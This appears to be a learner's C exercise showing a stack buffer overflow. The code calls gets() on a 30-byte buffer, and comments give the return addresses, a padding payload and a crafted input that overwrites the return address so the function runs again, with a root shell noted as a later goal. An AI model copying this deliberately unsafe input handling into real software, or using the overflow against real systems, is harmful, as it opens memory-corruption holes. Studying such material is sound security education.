void return_input(void){
    char array[30];

    gets (array);
    printf("%s\n",array);
}

main() {

    return_input();
    return 0;
}


// 0x0804845f call for the function being used.
// 0x08048464 return address on the stack
// AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA; payload before the overflow...
// How to get root shell from here? TBA!
// How about we just jump to previous address to run this again?
// \x5f\x84\x04\x08
// AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x5f\x84\x04\x08
// \x5f\x84\x04\x08 is shell code memory for 0x804845f
